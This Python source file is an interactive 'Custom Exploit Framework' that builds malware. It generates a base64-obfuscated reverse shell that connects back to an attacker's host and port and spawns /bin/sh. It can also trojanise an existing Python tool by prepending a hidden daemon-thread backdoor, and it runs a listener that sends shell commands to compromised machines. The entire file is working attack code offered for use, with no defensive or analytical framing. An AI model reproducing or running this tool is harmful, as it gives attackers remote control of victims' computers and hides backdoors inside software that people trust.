import os
import socket
import base64

def banner():
    print("\n" + "=" * 50)
    print("         Custom Exploit Framework (CEF)        ")
    print("=" * 50 + "\n")

def help_menu():
    print("\nAvailable Commands:")
    print("  help      - Show this help menu")
    print("  infect    - Create a standalone malicious Python file")
    print("  bind      - Infect an existing Python tool with a backdoor")
    print("  listen    - Start a listener on a specified port")
    print("  exit      - Exit the framework\n")

def create_payload(ip, port):
    payload = f"""
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"""
    return base64.b64encode(payload.encode()).decode()

def generate_infected_file(ip, port, output_file):
    encoded_payload = create_payload(ip, port)
    with open(output_file, "w") as f:
        f.write(f'import base64; exec(base64.b64decode("{encoded_payload}").decode())')
    print(f"\nPayload saved as {output_file}\n")

def bind_payload(ip, port, target_file, output_file):
    if not os.path.exists(target_file):
        print("\n[!] Error: The target file does not exist.\n")
        return
    
    with open(target_file, "r") as f:
        original_code = f.read()

    encoded_payload = create_payload(ip, port)
    trojan_code = f"""
import threading, base64

def backdoor():
    exec(base64.b64decode("{encoded_payload}").decode())

t = threading.Thread(target=backdoor)
t.daemon = True
t.start()
"""
    combined_code = trojan_code + "\n" + original_code

    with open(output_file, "w") as f:
        f.write(combined_code)

    print(f"\n[+] Successfully infected {target_file} -> {output_file}\n")

def start_listener(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"\n[*] Listening on port {port}...\n")
        conn, addr = s.accept()
        print(f"[+] Connection received from {addr}")
        while True:
            cmd = input("Shell> ")
            if cmd.strip().lower() == "exit":
                break
            conn.send(cmd.encode() + b"\n")
            print(conn.recv(4096).decode(), end="")

def main():
    banner()
    while True:
        cmd = input("CEF> ").strip().lower()
        
        if cmd == "help":
            help_menu()
        elif cmd == "infect":
            ip = input("Enter LHOST (your IP): ").strip()
            port = input("Enter LPORT: ").strip()
            output = input("Enter output filename (e.g., shell.py): ").strip()
            generate_infected_file(ip, port, output)
        elif cmd == "bind":
            target = input("Enter the path of the Python tool to infect: ").strip()
            ip = input("Enter LHOST (your IP): ").strip()
            port = input("Enter LPORT: ").strip()
            output = input("Enter output filename (e.g., infected_tool.py): ").strip()
            bind_payload(ip, port, target, output)
        elif cmd == "listen":
            port = int(input("Enter port to listen on: ").strip())
            start_listener(port)
        elif cmd == "exit":
            print("Exiting...")
            break
        else:
            print("Invalid command. Type 'help' for options.")

if __name__ == "__main__":
    main()
